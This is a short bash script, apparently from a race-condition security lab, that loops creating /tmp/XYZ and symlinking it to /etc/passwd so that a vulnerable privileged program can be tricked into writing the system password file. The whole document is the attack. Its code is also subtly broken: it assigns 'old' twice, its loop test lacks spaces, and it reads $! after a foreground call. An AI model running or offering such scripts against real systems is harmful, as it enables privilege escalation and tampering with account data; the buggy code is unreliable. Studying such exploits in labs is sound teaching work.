#!/bin/bash
# attack.sh
race()
{
	old=`ls -l /etc/passwd`
	old=`ls -l /etc/passwd`
	while [ "$old"="$new" ]
	do
		rm -f /tmp/XYZ
		>/tmp/XYZ
		ln -sf /etc/passwd /tmp/XYZ
		new=`ls -l /etc/passwd`
	done
}

race
echo "Stop... The passwd has been changed!"
RACE_PID=$!
kill $RACE_PID
